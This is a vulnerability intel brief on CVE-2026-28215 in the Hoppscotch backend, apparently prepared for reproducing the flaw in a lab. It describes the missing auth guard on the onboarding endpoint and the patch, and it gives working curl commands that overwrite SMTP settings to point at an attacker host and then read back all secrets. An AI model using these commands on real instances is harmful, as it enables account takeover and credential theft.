# Intel Brief: CVE-2026-28215

## CVE ID
CVE-2026-28215

## Affected Software
- **Name**: Hoppscotch (hoppscotch-backend)
- **Vendor**: hoppscotch
- **Type**: Self-hosted API development ecosystem (NestJS backend)
- **Component**: `OnboardingController` — REST endpoint `POST /v1/onboarding/config`

## Severity
- **CVSS Score**: 9.1 (CRITICAL)
- **CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
- **EPSS**: 0.1% (24.7th percentile)

## CWE Classification
- **CWE-284**: Improper Access Control
- **CWE-287**: Improper Authentication

## Description
The `POST /v1/onboarding/config` endpoint in Hoppscotch self-hosted backend has no authentication guard and performs no check on whether onboarding was already completed. An unauthenticated remote attacker can send a single HTTP POST request to overwrite the entire infrastructure configuration of a self-hosted Hoppscotch instance, including:

- OAuth provider credentials (Google, GitHub, Microsoft client IDs and secrets)
- OAuth callback URLs (redirect to attacker-controlled servers)
- SMTP/mailer settings (intercept magic-link emails)
- Allowed authentication providers list

The endpoint also returns a recovery token in the response that can be used to read back ALL infrastructure secrets (including existing SMTP passwords and OAuth client secrets) via `GET /v1/onboarding/config?token=<recovery_token>`.

### Attack Impact
1. **OAuth hijacking**: Replace legitimate OAuth client credentials with attacker-controlled ones, capturing all SSO login tokens
2. **Secret exfiltration**: The response includes a `token` that can query `GET /v1/onboarding/config?token=<token>` to reveal ALL plaintext infra config including SMTP passwords and OAuth secrets
3. **Email interception**: Redirect magic-link emails through attacker SMTP infrastructure
4. **Full account takeover**: Complete control over authentication flows for all users

## Vulnerability Root Cause (Technical Detail)

### Vulnerable Code: `packages/hoppscotch-backend/src/infra-config/onboarding.controller.ts`

The `OnboardingController` at path `/v1/onboarding/config` uses only `ThrottlerBehindProxyGuard` (rate limiting) — **no JWT authentication, no admin authorization, no session validation**:

```typescript
@Controller({ path: 'onboarding', version: '1' })
@UseGuards(ThrottlerBehindProxyGuard)  // ONLY rate limiting, NO auth
export class OnboardingController {
  // ...
  @Post('config')
  async updateOnboardingConfig(@Body() dto: SaveOnboardingConfigRequest) {
    // NO check if onboarding was already completed
    // Directly calls service to overwrite all infra config
    const updateConfigResult =
      await this.infraConfigService.updateOnboardingConfig(dto);
    // ...
  }
}
```

The `updateOnboardingConfig` service method:
1. Generates a new `onboardingRecoveryToken` (UUID)
2. Overwrites ALL provided config entries in the `InfraConfig` database table
3. Sets `ONBOARDING_COMPLETED=true`
4. Returns the recovery token in the response

### Fix Applied (commit `a1be60da`)

The fix adds a guard to `updateOnboardingConfig` that checks onboarding status before allowing the update:

```typescript
async updateOnboardingConfig(@Body() dto: SaveOnboardingConfigRequest) {
  // NEW: Check if onboarding was already completed
  const onboardingStatus = await this.infraConfigService.getOnboardingStatus();
  if (E.isLeft(onboardingStatus)) { /* error handling */ }
  
  // NEW: Block re-run if onboarding completed AND users exist
  if (onboardingStatus.right.onboardingCompleted && !onboardingStatus.right.canReRunOnboarding) {
    throwHTTPErr({ message: ONBOARDING_CANNOT_BE_RERUN, statusCode: HttpStatus.BAD_REQUEST });
  }
  // ... rest of method
}
```

`canReRunOnboarding` is `true` only when `usersCount === 0` (empty database), so the endpoint is blocked once any user has been created after initial onboarding.

## Repository URL
- **URL**: https://github.com/hoppscotch/hoppscotch.git
- **Monorepo**: Yes (pnpm workspace)
- **Vulnerable Package Path**: `packages/hoppscotch-backend/`

## Versions
- **Vulnerable Version**: `2026.1.1` (tag: `2026.1.1`) — last release before fix
  - All versions prior to `2026.2.0` are affected
  - Git checkout: `git checkout 2026.1.1` (HEAD at `ff906b7c`)
- **Fix Commit**: `a1be60da649296c9c94511499928b15f295c8a18`
  - Author: Mir Arif Hasan
  - Date: Mon Feb 23 18:41:45 2026 +0600
  - Message: "fix(backend): resolve security advisories for IDOR and onboarding bypass (#5897)"
  - PR: #5897
- **Patched Version**: `2026.2.0` (tag: `2026.2.0`)
  - Release commit: `a40c491f` (version bump), full release at `1119a220`

## Build System
- **Package Manager**: pnpm 10.28.1 (monorepo with pnpm workspaces)
- **Runtime**: Node.js (Dockerfile uses `node:20.12.2`)
- **Framework**: NestJS (`@nestjs/core`, `@nestjs/common`, etc.)
- **Build Command**: `nest build` (via `pnpm run build`)
- **Start Command**: `pnpm run start:prod` → `node dist/main`
- **Database**: PostgreSQL 15 (via Prisma ORM)
- **ORM**: Prisma Client (`@prisma/client`) with `prisma generate` + `prisma migrate deploy`

## Key Dependencies
- **@nestjs/core, @nestjs/common**: NestJS framework
- **@nestjs/swagger**: OpenAPI/Swagger (API docs at the endpoint)
- **@prisma/client, prisma**: PostgreSQL ORM
- **pg**: PostgreSQL driver
- **@nestjs/passport, passport-***: Authentication (Google, GitHub, Microsoft OAuth)
- **@nestjs/jwt**: JWT token handling
- **@nestjs/throttler**: Rate limiting (the only guard on the vulnerable endpoint)
- **fp-ts**: Functional programming (Either monad for error handling)
- **class-validator, class-transformer**: DTO validation and transformation
- **nodemailer, @nestjs-modules/mailer**: Email sending
- **argon2, bcrypt**: Password hashing

## Docker Deployment
- **Existing Dockerfile**: `packages/hoppscotch-backend/Dockerfile` (builder + dev/prod targets)
- **Production Dockerfile**: `prod.Dockerfile` at repo root (multi-stage with Caddy, webapp server, backend)
- **docker-compose.yml**: Available at repo root with multiple profiles
  - `default` profile: AIO (all-in-one) + PostgreSQL + auto-migration
  - Backend listens on port 3170 (mapped from container port 3170 or 8080)
  - PostgreSQL on port 5432 (user: `postgres`, password: `testpass`, db: `hoppscotch`)
  - Requires `.env` file (`.env.example` provided)
  - Migration: `pnpm exec prisma migrate deploy`
- **Database URL**: `postgresql://postgres:testpass@hoppscotch-db:5432/hoppscotch?connect_timeout=300`
- **Required Env Var**: `DATA_ENCRYPTION_KEY` (32-character encryption key for secrets in DB)

## Lab Build Guidance
The simplest approach for the lab is:
1. Use the existing `packages/hoppscotch-backend/Dockerfile` (deprecated but simpler, single-service)
2. Set up PostgreSQL 15 container
3. Run Prisma migrations (`pnpm exec prisma migrate deploy`)
4. Start backend with `pnpm run start:prod`
5. The vulnerable endpoint will be at `http://localhost:3170/v1/onboarding/config`

Alternatively, use the `docker-compose.yml` with `--profile default` for the full AIO setup (backend + PostgreSQL + auto-migration in one compose).

## PoC Strategy
The exploit is trivially simple — a single unauthenticated HTTP POST:

```bash
# Step 1: Overwrite infrastructure config and get recovery token
curl -X POST http://<target>:3170/v1/onboarding/config \
  -H "Content-Type: application/json" \
  -d '{
    "VITE_ALLOWED_AUTH_PROVIDERS": "EMAIL",
    "MAILER_SMTP_ENABLE": "true",
    "MAILER_USE_CUSTOM_CONFIGS": "true",
    "MAILER_SMTP_HOST": "attacker-smtp.example.com",
    "MAILER_SMTP_PORT": "587",
    "MAILER_SMTP_SECURE": "true",
    "MAILER_SMTP_USER": "attacker@example.com",
    "MAILER_SMTP_PASSWORD": "attacker-password",
    "MAILER_ADDRESS_FROM": "noreply@example.com",
    "MAILER_TLS_REJECT_UNAUTHORIZED": "true"
  }'
# Response: {"token": "<recovery-uuid>"}

# Step 2: Use recovery token to exfiltrate ALL secrets
curl "http://<target>:3170/v1/onboarding/config?token=<recovery-uuid>"
# Response: ALL infra config including OAuth secrets, SMTP passwords, etc.
```

### Verification Steps
1. **Pre-condition**: Deploy Hoppscotch self-hosted at vulnerable version with completed onboarding
2. **Exploit**: Send POST to `/v1/onboarding/config` with attacker config
3. **Verify**: Response returns 201 with a `token` field (should have been blocked with 400)
4. **Confirm**: Use token to GET `/v1/onboarding/config?token=<token>` and verify attacker config was written
5. **Post-patch**: Same POST should return 400 with `onboarding/cannot_be_rerun`

## Public Exploits
- **None found**: No public PoC scripts on ExploitDB, Metasploit, or GitHub as of 2026-02-28
- **Nuclei templates**: None available
- The exploit is trivial (single curl command) so custom PoC creation is straightforward

## References
1. **GHSA Advisory**: https://github.com/hoppscotch/hoppscotch/security/advisories/GHSA-jwv8-867r-q9fg
2. **Release Notes**: https://github.com/hoppscotch/hoppscotch/releases/tag/2026.2.0
3. **Fix PR**: https://github.com/hoppscotch/hoppscotch/pull/5897
4. **Fix Commit**: https://github.com/hoppscotch/hoppscotch/commit/a1be60da649296c9c94511499928b15f295c8a18
5. **Repository**: https://github.com/hoppscotch/hoppscotch

## Files Changed in Fix
| File | Changes |
|------|---------|
| `packages/hoppscotch-backend/src/errors.ts` | Added `INFRA_CONFIG_FETCH_FAILED` and `ONBOARDING_CANNOT_BE_RERUN` error constants |
| `packages/hoppscotch-backend/src/infra-config/infra-config.service.ts` | Wrapped `getOnboardingStatus()` in try/catch |
| `packages/hoppscotch-backend/src/infra-config/onboarding.controller.ts` | Added onboarding completion check before `updateOnboardingConfig` |
| `packages/hoppscotch-backend/src/user-environment/*` | IDOR fix (separate vulnerability, not relevant) |
